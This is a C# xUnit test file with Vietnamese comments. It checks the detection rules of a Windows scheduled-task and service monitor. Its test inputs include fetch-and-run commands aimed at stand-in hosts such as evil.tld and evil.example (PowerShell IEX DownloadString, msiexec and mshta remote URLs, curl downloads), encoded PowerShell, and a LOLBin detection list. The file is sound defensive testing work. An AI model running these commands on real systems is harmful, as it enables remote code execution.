using TaskServiceMonitor.Detection;
using TaskServiceMonitor.Models;
using TaskServiceMonitor.Monitoring;
using Xunit;

namespace TaskServiceMonitor.Tests;

/// <summary>
/// Test cho danh mục rule phát hiện (bước 11). Đối chiếu 1-1 với bảng "hành vi → Event
/// ID → rule" trong docs/hanh-vi-mapping.md — mỗi gạch đầu dòng mentor nêu phải có ít
/// nhất một test chứng minh app bắt được.
///
/// Toàn bộ rule ở <see cref="RuleCatalog"/> là hàm thuần ⇒ test trực tiếp, không cần
/// DB hay Windows. Rule tương quan (cần DB) nằm ở <c>CorrelationRules</c>, không test
/// ở đây.
/// </summary>
public class RuleCatalogTests
{
    private readonly WindowsEventParser _parser = new();

    private WindowsMonitorEvent Parse(string fixture) => _parser.Parse(SampleXml.Load(fixture));

    private static string[] RuleIds(WindowsMonitorEvent evt) =>
        [.. RuleCatalog.Evaluate(evt).Select(h => h.Rule.Id)];

    private static RuleHit? HitFor(WindowsMonitorEvent evt, string ruleId) =>
        RuleCatalog.Evaluate(evt).FirstOrDefault(h => h.Rule.Id == ruleId).Hit;

    private static WindowsMonitorEvent Task(
        int eventId = 4698,
        string? command = null,
        string? arguments = null,
        string? runLevel = null,
        string? runAsUser = null,
        string rawXml = "<Event />") => new()
        {
            EventId = eventId,
            Hostname = "MAY-TEST",
            TimeCreated = DateTime.UtcNow,
            ObjectType = MonitoredObjectType.ScheduledTask,
            ObjectName = @"\WinSentinelTest",
            ActionDescription = "test",
            TaskCommand = command,
            TaskArguments = arguments,
            TaskRunLevel = runLevel,
            TaskRunAsUser = runAsUser,
            Channel = "Security",
            ProviderName = "test",
            Data = new Dictionary<string, string>(),
            RawXml = rawXml
        };

    private static WindowsMonitorEvent Service(
        int eventId = 7045,
        string? imagePath = null,
        string? startType = null,
        string? previousStartType = null,
        IReadOnlyDictionary<string, string>? data = null,
        string rawXml = "<Event />") => new()
        {
            EventId = eventId,
            Hostname = "MAY-TEST",
            TimeCreated = DateTime.UtcNow,
            ObjectType = MonitoredObjectType.Service,
            ObjectName = "WinSentinelTest",
            ActionDescription = "test",
            ImagePath = imagePath,
            StartType = startType,
            PreviousStartType = previousStartType,
            Channel = "System",
            ProviderName = "test",
            Data = data ?? new Dictionary<string, string>(),
            RawXml = rawXml
        };

    // ============================================================ SCHEDULED TASK

    /// <summary>Mentor: "Tạo mới task" / "Xóa bỏ task".</summary>
    [Theory]
    [InlineData(4698, RuleCatalog.TaskCreated)]
    [InlineData(106, RuleCatalog.TaskCreated)]
    [InlineData(4699, RuleCatalog.TaskDeleted)]
    [InlineData(141, RuleCatalog.TaskDeleted)]
    [InlineData(4700, RuleCatalog.TaskToggled)]
    [InlineData(4701, RuleCatalog.TaskToggled)]
    [InlineData(4702, RuleCatalog.TaskUpdated)]
    [InlineData(140, RuleCatalog.TaskUpdated)]
    public void VongDoiTask_KhopDungRule(int eventId, string expectedRuleId)
    {
        Assert.Contains(expectedRuleId, RuleIds(Task(eventId)));
    }

    /// <summary>
    /// Mentor: "Thực thi từ thư mục bất thường: %TEMP%, C:\Users\Public".
    /// Bao gồm cả dạng biến môi trường NGUYÊN VĂN — task lưu đúng chuỗi người dùng gõ,
    /// không tự giãn.
    /// </summary>
    [Theory]
    [InlineData(@"C:\Users\Public\a.cmd")]
    [InlineData(@"C:\Users\x\AppData\Local\Temp\dropper.exe")]
    [InlineData(@"%TEMP%\a.exe")]
    [InlineData(@"%APPDATA%\b.exe")]
    [InlineData(@"%PUBLIC%\c.exe")]
    [InlineData(@"C:\Windows\Temp\d.exe")]
    [InlineData(@"C:\Users\x\Downloads\e.exe")]
    public void TaskChayTuThuMucGhiDuoc_High(string command)
    {
        var hit = HitFor(Task(command: command), RuleCatalog.TaskWritableDir);

        Assert.NotNull(hit);
        Assert.Equal(RiskLevel.High, hit.Severity);
    }

    /// <summary>
    /// Đường dẫn đáng ngờ nấp trong THAM SỐ: Command là cmd.exe hoàn toàn hợp lệ nên
    /// chỉ soi Command là bỏ sót.
    /// </summary>
    [Fact]
    public void TaskCoDuongDanDangNgoTrongThamSo_VanBat()
    {
        var evt = Task(
            command: @"C:\Windows\System32\cmd.exe",
            arguments: @"/c C:\Users\Public\payload.bat");

        Assert.Contains(RuleCatalog.TaskWritableDir, RuleIds(evt));
    }

    /// <summary>ProgramData chỉ Medium — rất nhiều phần mềm hợp lệ dùng thư mục này.</summary>
    [Fact]
    public void TaskChayTuProgramData_ChiMedium()
    {
        var hit = HitFor(Task(command: @"C:\ProgramData\Vendor\update.exe"), RuleCatalog.TaskWritableDir);

        Assert.NotNull(hit);
        Assert.Equal(RiskLevel.Medium, hit.Severity);
    }

    /// <summary>Mentor: "các lệnh đáng ngờ (mshta.exe...)".</summary>
    [Theory]
    [InlineData(@"C:\Windows\System32\mshta.exe")]
    [InlineData(@"C:\Windows\System32\regsvr32.exe")]
    [InlineData(@"C:\Windows\System32\certutil.exe")]
    [InlineData(@"C:\Windows\System32\wscript.exe")]
    public void TaskGoiLolBin_High(string command)
    {
        var hit = HitFor(Task(command: command), RuleCatalog.TaskLolBin);

        Assert.NotNull(hit);
        Assert.Equal(RiskLevel.High, hit.Severity);
    }

    /// <summary>
    /// TINH CHINH TU DU LIEU THAT — đừng đảo ngược nếu chưa đo lại.
    ///
    /// rundll32/msiexec nằm ở System32 và KHÔNG có dấu hiệu chạy từ xa thì KHÔNG báo.
    /// Chấm theo tên thôi thì trên 15.059 event thật, rundll32 sinh 6 cảnh báo High và
    /// cả 6 đều là dương tính giả (một task Microsoft: PcaPatchDbTask).
    /// </summary>
    [Theory]
    [InlineData(@"%windir%\system32\rundll32.exe", "apphelp.dll,ShimFlushCache")]
    [InlineData(@"C:\Windows\System32\msiexec.exe", "/i product.msi /qn")]
    [InlineData(@"C:\Windows\System32\rundll32.exe", null)]
    public void LolBinCanNguCanh_KhongCoDauHieuTuXa_KhongBao(string command, string? arguments)
    {
        Assert.DoesNotContain(RuleCatalog.TaskLolBin, RuleIds(Task(command: command, arguments: arguments)));
    }

    /// <summary>Nhưng rundll32/msiexec KÈM dấu hiệu tải/chạy từ xa thì vẫn phải bắt.</summary>
    [Theory]
    [InlineData(@"C:\Windows\System32\rundll32.exe", "javascript:alert(1)")]
    [InlineData(@"C:\Windows\System32\rundll32.exe", @"\\10.0.0.5\share\eviI.dll,Start")]
    [InlineData(@"C:\Windows\System32\msiexec.exe", "/i https://evil.example/p.msi /qn")]
    [InlineData(@"C:\Windows\System32\rundll32.exe", "scrobj.dll,Run")]
    public void LolBinCanNguCanh_CoDauHieuTuXa_High(string command, string arguments)
    {
        var hit = HitFor(Task(command: command, arguments: arguments), RuleCatalog.TaskLolBin);

        Assert.NotNull(hit);
        Assert.Equal(RiskLevel.High, hit.Severity);
    }

    /// <summary>Mentor: "powershell -enc". LOLBin nấp trong tham số cũng phải bắt.</summary>
    [Theory]
    [InlineData("-enc SQBuAHYA")]
    [InlineData("-EncodedCommand SQBuAHYA")]
    [InlineData("-w hidden -nop")]
    [InlineData("-ExecutionPolicy Bypass -File x.ps1")]
    [InlineData("IEX (New-Object Net.WebClient).DownloadString('http://x')")]
    public void TaskDungPowerShellDangNgo_High(string arguments)
    {
        var evt = Task(command: @"C:\Windows\System32\powershell.exe", arguments: arguments);
        var hit = HitFor(evt, RuleCatalog.TaskEncodedPs);

        Assert.NotNull(hit);
        Assert.Equal(RiskLevel.High, hit.Severity);
    }

    /// <summary>Mentor: "Thực thi với quyền cao: NT AUTHORITY\SYSTEM hoặc administrator".</summary>
    [Theory]
    [InlineData("HighestAvailable", null)]
    [InlineData(null, "S-1-5-18")]
    [InlineData(null, "LocalSystem")]
    [InlineData(null, @"NT AUTHORITY\SYSTEM")]
    [InlineData(null, @"BUILTIN\Administrators")]
    public void TaskChayQuyenCao_Medium(string? runLevel, string? runAsUser)
    {
        var evt = Task(runLevel: runLevel, runAsUser: runAsUser, command: @"C:\Windows\System32\cmd.exe");
        var hit = HitFor(evt, RuleCatalog.TaskElevated);

        Assert.NotNull(hit);
        Assert.Equal(RiskLevel.Medium, hit.Severity);
    }

    /// <summary>Task chạy dưới tài khoản người dùng thường thì KHÔNG được báo.</summary>
    [Theory]
    [InlineData("Users")]
    [InlineData("S-1-5-21-1111-2222-3333-1001")]
    [InlineData("DESKTOP-ABC\\kazyy")]
    public void TaskChayQuyenThuong_KhongBao(string runAsUser)
    {
        Assert.DoesNotContain(RuleCatalog.TaskElevated, RuleIds(Task(runAsUser: runAsUser)));
    }

    /// <summary>
    /// Task quyền cao TRỎ VÀO thư mục ghi được = leo thang đặc quyền kinh điển.
    /// Cả hai rule cùng khớp, và mức tổng phải là High.
    /// </summary>
    [Fact]
    public void TaskQuyenCaoOThuMucGhiDuoc_SinhCaHaiCanhBao()
    {
        var evt = Task(
            command: @"C:\Users\Public\evil.exe",
            runLevel: "HighestAvailable",
            runAsUser: "S-1-5-18");

        var ids = RuleIds(evt);

        Assert.Contains(RuleCatalog.TaskWritableDir, ids);
        Assert.Contains(RuleCatalog.TaskElevated, ids);
        Assert.Equal(RiskLevel.High, RuleCatalog.HighestSeverity(evt));
    }

    /// <summary>
    /// Task dùng ComHandler KHÔNG có Command — đây là dữ liệu thật (rất nhiều task hệ
    /// thống như vậy), không phải parse lỗi. Rule phải bỏ qua êm, không nổ.
    /// </summary>
    [Fact]
    public void TaskComHandlerKhongCoCommand_KhongNo()
    {
        var evt = Task(command: null) with { TaskActionType = "ComHandler" };

        var ids = RuleIds(evt);

        Assert.DoesNotContain(RuleCatalog.TaskWritableDir, ids);
        Assert.DoesNotContain(RuleCatalog.TaskLolBin, ids);
    }

    // ================================================================= SERVICE

    /// <summary>Mentor: "Tạo mới hoặc cài đặt Service" — một thao tác, hai event.</summary>
    [Theory]
    [InlineData(7045)]
    [InlineData(4697)]
    public void CaiService_KhopRule(int eventId)
    {
        Assert.Contains(RuleCatalog.ServiceInstalled,
            RuleIds(Service(eventId, imagePath: @"C:\Windows\System32\svchost.exe")));
    }

    /// <summary>Mentor: "Service chạy từ thư mục Temp hoặc AppData".</summary>
    [Theory]
    [InlineData(@"C:\Windows\Temp\svc.exe")]
    [InlineData(@"C:\Users\x\AppData\Local\svc.exe")]
    [InlineData(@"C:\Users\Public\svc.exe")]
    public void ServiceOThuMucGhiDuoc_High(string imagePath)
    {
        var hit = HitFor(Service(imagePath: imagePath), RuleCatalog.ServiceNonStandardPath);

        Assert.NotNull(hit);
        Assert.Equal(RiskLevel.High, hit.Severity);
    }

    /// <summary>
    /// Mentor: "Service không nằm trong các thư mục hệ thống bảo mật". Ngoài System32
    /// nhưng cũng không phải thư mục ghi được ⇒ Medium, không phải High.
    /// </summary>
    [Fact]
    public void ServiceNgoaiThuMucHeThong_Medium()
    {
        var hit = HitFor(Service(imagePath: @"D:\Tools\myservice.exe"), RuleCatalog.ServiceNonStandardPath);

        Assert.NotNull(hit);
        Assert.Equal(RiskLevel.Medium, hit.Severity);
    }

    /// <summary>
    /// Service ở vị trí chuẩn thì KHÔNG được báo. Bao gồm cả dạng có dấu nháy + tham
    /// số và dạng tiền tố NT — đây là nơi dễ sinh dương tính giả hàng loạt nhất.
    /// </summary>
    [Theory]
    [InlineData(@"C:\Windows\System32\svchost.exe -k netsvcs")]
    [InlineData(@"""C:\Program Files\App\svc.exe"" -k")]
    [InlineData(@"\??\C:\Windows\System32\drivers\x.sys")]
    [InlineData(@"\SystemRoot\System32\drivers\y.sys")]
    [InlineData(@"C:\Windows\SysWOW64\z.exe")]
    public void ServiceOViTriChuan_KhongBao(string imagePath)
    {
        Assert.DoesNotContain(RuleCatalog.ServiceNonStandardPath, RuleIds(Service(imagePath: imagePath)));
    }

    /// <summary>Mentor: "Service Crash / Dừng đột ngột" — gồm cả 4 ID thêm ở bước 11.</summary>
    [Theory]
    [InlineData(7034)]
    [InlineData(7031)]
    [InlineData(7024)]
    [InlineData(7000)]
    [InlineData(7009)]
    public void ServiceDungBatThuong_KhopRule(int eventId)
    {
        var hit = HitFor(Service(eventId), RuleCatalog.ServiceCrash);

        Assert.NotNull(hit);
        Assert.Equal(RiskLevel.Medium, hit.Severity);
    }

    /// <summary>
    /// 7036 CỐ Ý không nằm trong nhóm crash: nó báo cả chuyển sang Running lẫn Stopped,
    /// mà chưa có mẫu thật để biết phân biệt bằng field nào — đưa vào là đoán cấu trúc.
    /// </summary>
    [Fact]
    public void Service7036_ChuaTinhLaCrash()
    {
        Assert.DoesNotContain(RuleCatalog.ServiceCrash, RuleIds(Service(7036)));
    }

    /// <summary>Mentor: "Thay đổi cấu hình" — start type là phần SCM có phát event.</summary>
    [Fact]
    public void DoiStartType_Medium()
    {
        var hit = HitFor(
            Service(7040, startType: "auto start", previousStartType: "demand start"),
            RuleCatalog.ServiceStartTypeChanged);

        Assert.NotNull(hit);
        Assert.Equal(RiskLevel.Medium, hit.Severity);
    }

    // ------------------------------------------------- 4657: đổi binPath / tài khoản

    /// <summary>
    /// Mentor: "Thay đổi cấu hình (ImagePath / binPath)". SCM KHÔNG phát event nào —
    /// đây là đường log thật duy nhất, qua audit registry.
    ///
    /// ⚠️ Nhánh này chưa có mẫu XML thật (máy dev chưa bật SACL). Rule đọc phòng thủ
    /// qua <c>Data</c> nên tên field khác dự đoán thì chỉ đơn giản không khớp.
    /// </summary>
    [Fact]
    public void Registry4657_DoiImagePath_High()
    {
        var evt = Service(4657, data: new Dictionary<string, string>
        {
            ["ObjectName"] = @"\REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\WinSentinelTest",
            ["ObjectValueName"] = "ImagePath",
            ["OldValue"] = @"C:\Windows\System32\good.exe",
            ["NewValue"] = @"C:\Users\Public\evil.exe"
        });

        var hit = HitFor(evt, RuleCatalog.ServiceImagePathChanged);

        Assert.NotNull(hit);
        Assert.Equal(RiskLevel.High, hit.Severity);
        Assert.Contains("evil.exe", hit.Evidence);
    }

    /// <summary>Mentor: "Thay đổi tài khoản khởi chạy". Đổi sang LocalSystem ⇒ High.</summary>
    [Fact]
    public void Registry4657_DoiTaiKhoanSangLocalSystem_High()
    {
        var evt = Service(4657, data: new Dictionary<string, string>
        {
            ["ObjectName"] = @"\REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\WinSentinelTest",
            ["ObjectValueName"] = "ObjectName",
            ["OldValue"] = @"NT AUTHORITY\LocalService",
            ["NewValue"] = "LocalSystem"
        });

        var hit = HitFor(evt, RuleCatalog.ServiceAccountChanged);

        Assert.NotNull(hit);
        Assert.Equal(RiskLevel.High, hit.Severity);
    }

    /// <summary>4657 trên khoá registry KHÁC (không phải Services) thì bỏ qua.</summary>
    [Fact]
    public void Registry4657_KhoaKhongPhaiServices_BoQua()
    {
        var evt = Service(4657, data: new Dictionary<string, string>
        {
            ["ObjectName"] = @"\REGISTRY\MACHINE\SOFTWARE\Vendor\App",
            ["ObjectValueName"] = "ImagePath",
            ["NewValue"] = @"C:\Users\Public\evil.exe"
        });

        Assert.DoesNotContain(RuleCatalog.ServiceImagePathChanged, RuleIds(evt));
    }

    [Theory]
    [InlineData(@"\REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\Spooler\ImagePath", "Spooler")]
    [InlineData(@"\REGISTRY\MACHINE\SYSTEM\CurrentControlSet\Services\BITS", "BITS")]
    public void BocTenServiceTuDuongDanRegistry(string keyPath, string expected)
    {
        Assert.Equal(expected, RuleCatalog.ServiceNameFromRegistryPath(keyPath));
    }

    // ========================================================== Lưới an toàn

    /// <summary>
    /// Dấu hiệu nằm trong RawXml nhưng không ở field đã parse — hành vi của
    /// RiskScorer trước bước 11, cố ý giữ lại.
    /// </summary>
    [Fact]
    public void DauHieuChiNamTrongRawXml_VanBat()
    {
        var evt = Service(rawXml: "<Event><Data>powershell -w hidden</Data></Event>");
        var hit = HitFor(evt, RuleCatalog.SuspiciousRawContent);

        Assert.NotNull(hit);
        Assert.Equal(RiskLevel.High, hit.Severity);
    }

    /// <summary>
    /// Không được sinh cảnh báo TRÙNG Ý NGHĨA: khi dấu hiệu đã nằm ở field có cấu trúc
    /// thì rule chuyên biệt lo, lưới an toàn phải im.
    /// </summary>
    [Fact]
    public void DauHieuDaCoRuleRieng_LuoiAnToanKhongBaoTrung()
    {
        var evt = Task(
            command: @"C:\Windows\System32\powershell.exe",
            arguments: "-w hidden",
            rawXml: "<Event><Data>powershell -w hidden</Data></Event>");

        var ids = RuleIds(evt);

        Assert.Contains(RuleCatalog.TaskEncodedPs, ids);
        Assert.DoesNotContain(RuleCatalog.SuspiciousRawContent, ids);
    }

    // ====================================================== Trên toàn bộ mẫu thật

    /// <summary>
    /// Test QUAN TRỌNG NHẤT của tầng phát hiện: không mẫu XML thật nào sinh ra cảnh
    /// báo mức High. Nới rule đến mức gây dương tính giả trên dữ liệu bình thường thì
    /// test này đổ.
    /// </summary>
    [Theory]
    [InlineData("4697_service_installed_security.xml")]
    [InlineData("4698_task_created_exec.xml")]
    [InlineData("4699_task_deleted.xml")]
    [InlineData("4700_task_enabled.xml")]
    [InlineData("4701_task_disabled_comhandler.xml")]
    [InlineData("4701_task_disabled_exec.xml")]
    [InlineData("4702_task_updated_comhandler.xml")]
    [InlineData("7040_service_starttype_changed.xml")]
    [InlineData("7045_service_installed_system.xml")]
    [InlineData("106_task_registered_operational.xml")]
    [InlineData("140_task_updated_operational.xml")]
    [InlineData("141_task_deleted_operational.xml")]
    [InlineData("200_task_action_started.xml")]
    [InlineData("201_task_action_completed.xml")]
    public void MauThat_KhongSinhCanhBaoHigh(string fixture)
    {
        var hits = RuleCatalog.Evaluate(Parse(fixture));

        Assert.DoesNotContain(hits, h => h.Hit.Severity == RiskLevel.High);
    }

    /// <summary>Mọi rule phải có bằng chứng đọc được, không được để trống.</summary>
    [Theory]
    [InlineData("4698_task_created_exec.xml")]
    [InlineData("7045_service_installed_system.xml")]
    [InlineData("7040_service_starttype_changed.xml")]
    public void MoiCanhBaoDeuCoCauBangChung(string fixture)
    {
        var hits = RuleCatalog.Evaluate(Parse(fixture));

        Assert.NotEmpty(hits);
        Assert.All(hits, h => Assert.False(string.IsNullOrWhiteSpace(h.Hit.Evidence)));
    }

    // ============================================================ Bảng rule

    /// <summary>
    /// Bảng rule trả cho <c>GET /api/alerts/rules</c> phải phủ CẢ hai rule tương quan
    /// (vốn không nằm trong <c>All</c> vì cần DB) — nếu không mentor đọc bảng sẽ thấy
    /// thiếu đúng phần "phân tích tương quan hành vi".
    /// </summary>
    [Fact]
    public void BangRule_CoCaRuleTuongQuan()
    {
        var ids = RuleCatalog.Describe().Select(r => r.Id).ToArray();

        Assert.Contains(RuleCatalog.TaskCommandChanged, ids);
        Assert.Contains(RuleCatalog.TaskCreateThenDelete, ids);
        Assert.Equal(ids.Length, ids.Distinct().Count());
    }

    /// <summary>Mã rule không được trùng nhau.</summary>
    [Fact]
    public void MaRule_KhongTrung()
    {
        var ids = RuleCatalog.All.Select(r => r.Id).ToArray();

        Assert.Equal(ids.Length, ids.Distinct().Count());
    }

    // ==================================================== cmd / powershell (bước 14)
    //
    // Mentor neu dich danh 'cmd /c'. Nhung day la hai binary duoc task hop le dung
    // nhieu nhat tren mot may Windows, nen BAT BUOC xet theo ngu canh - cung ly do
    // rundll32 phai tach ra ContextualLolBins sau khi do duoc 6/6 duong tinh gia.

    /// <summary>
    /// Nhóm này là lý do rule phải xét ngữ cảnh. Gọi shell với tham số vô hại là
    /// chuyện hoàn toàn bình thường — báo động ở đây là tự làm ngập tab Cảnh báo.
    /// </summary>
    [Theory]
    [InlineData(@"C:\Windows\System32\cmd.exe", "/c echo hello")]
    [InlineData(@"C:\Windows\System32\cmd.exe", @"/c C:\Program Files\App\run.bat")]
    [InlineData(@"C:\Windows\System32\powershell.exe", @"-File C:\Program Files\App\job.ps1")]
    public void Shell_ThamSoVoHai_KhongCanhBao(string command, string arguments)
    {
        Assert.DoesNotContain(
            RuleCatalog.TaskLolBin,
            RuleIds(Task(command: command, arguments: arguments)));
    }

    /// <summary>Bốn loại ngữ cảnh biến một lời gọi shell thành đáng ngờ.</summary>
    [Theory]
    // 1. tham so tro vao thu muc nguoi dung ghi duoc - dung truong hop mentor neu
    [InlineData(@"C:\Windows\System32\cmd.exe", @"/c C:\Users\Public\a.bat")]
    [InlineData(@"C:\Windows\System32\cmd.exe", @"/c %TEMP%\dropper.bat")]
    // 2. tai / chay tu xa
    [InlineData(@"C:\Windows\System32\cmd.exe", "/c curl http://evil.tld/a.exe")]
    [InlineData(@"C:\Windows\System32\powershell.exe", @"-c \\attacker\share\x.ps1")]
    // 3. co dang ngo
    [InlineData(@"C:\Windows\System32\powershell.exe", "-nop -w hidden -enc SQBFAFgA")]
    // 4. noi nhieu lenh
    [InlineData(@"C:\Windows\System32\cmd.exe", "/c whoami && net user")]
    public void Shell_CoNguCanhDangNgo_CanhBaoHigh(string command, string arguments)
    {
        var hit = HitFor(Task(command: command, arguments: arguments), RuleCatalog.TaskLolBin);

        Assert.NotNull(hit);
        Assert.Equal(RiskLevel.High, hit.Severity);
    }

    /// <summary>Shell không có tham số thì không có ngữ cảnh nào để xét.</summary>
    [Fact]
    public void Shell_KhongThamSo_KhongCanhBao()
    {
        Assert.DoesNotContain(
            RuleCatalog.TaskLolBin,
            RuleIds(Task(command: @"C:\Windows\System32\cmd.exe")));
    }

    // ==================================== Phân tích lệnh của Service (bước 14)

    /// <summary>
    /// Lỗ hổng bất đối xứng đã vá: trước bước 14 phía Service KHÔNG có rule nào đọc
    /// dòng lệnh (Task có ba). Service trỏ vào System32 — đường dẫn hoàn toàn chuẩn
    /// nên <c>SERVICE_NONSTANDARD_PATH</c> im lặng — mà chạy shell thì lọt hoàn toàn.
    /// </summary>
    [Fact]
    public void Service_DuongDanChuanNhungLenhDangNgo_VanCanhBao()
    {
        var evt = Service(imagePath: @"C:\Windows\System32\cmd.exe /c powershell -enc SQBFAFgA");

        // Duong dan chuan nen rule cu khong bat.
        Assert.DoesNotContain(RuleCatalog.ServiceNonStandardPath, RuleIds(evt));

        var hit = HitFor(evt, RuleCatalog.ServiceSuspiciousCommand);
        Assert.NotNull(hit);
        Assert.Equal(RiskLevel.High, hit.Severity);
    }

    [Fact]
    public void Service_LolBinTrongImagePath_CanhBao()
    {
        var hit = HitFor(
            Service(imagePath: @"C:\Windows\System32\mshta.exe http://evil.tld/a.hta"),
            RuleCatalog.ServiceSuspiciousCommand);

        Assert.NotNull(hit);
    }

    /// <summary>Service bình thường không được báo — đây là phần chống dương tính giả.</summary>
    [Theory]
    [InlineData(@"C:\Windows\System32\svchost.exe -k netsvcs")]
    [InlineData(@"""C:\Program Files\App\service.exe""")]
    [InlineData(@"\??\C:\Windows\System32\drivers\driver.sys")]
    public void Service_LenhBinhThuong_KhongCanhBao(string imagePath)
    {
        Assert.DoesNotContain(
            RuleCatalog.ServiceSuspiciousCommand,
            RuleIds(Service(imagePath: imagePath)));
    }

    // ============================== Phân biệt "khai báo" với "đã thực thi" (bước 14)

    /// <summary>
    /// Mentor nhấn mạnh "theo dõi ... khi chúng THỰC THI". Event 200/201 nghĩa là task
    /// đã CHẠY THẬT, khác hẳn 4698 mới chỉ là đăng ký — câu bằng chứng phải nói rõ để
    /// người trực thấy ngay, không phải tự tra Event ID.
    /// </summary>
    [Fact]
    public void EventThucThi_CauBangChungGhiRoDaChay()
    {
        var declared = HitFor(
            Task(eventId: 4698, command: @"C:\Users\Public\a.exe"), RuleCatalog.TaskWritableDir);

        var executed = HitFor(
            Task(eventId: 200, command: @"C:\Users\Public\a.exe"), RuleCatalog.TaskWritableDir);

        Assert.NotNull(declared);
        Assert.NotNull(executed);

        Assert.DoesNotContain("ĐÃ THỰC THI", declared.Evidence);
        Assert.Contains("ĐÃ THỰC THI", executed.Evidence);
    }

    /// <summary>Bảng rule phải có cả hai rule mới, nếu không mentor đọc bảng sẽ thấy thiếu.</summary>
    [Fact]
    public void BangRule_CoRuleMoiCuaBuoc14()
    {
        var ids = RuleCatalog.Describe().Select(r => r.Id).ToArray();

        Assert.Contains(RuleCatalog.ServiceSuspiciousCommand, ids);
        Assert.Contains(RuleCatalog.BlacklistHit, ids);
    }
}
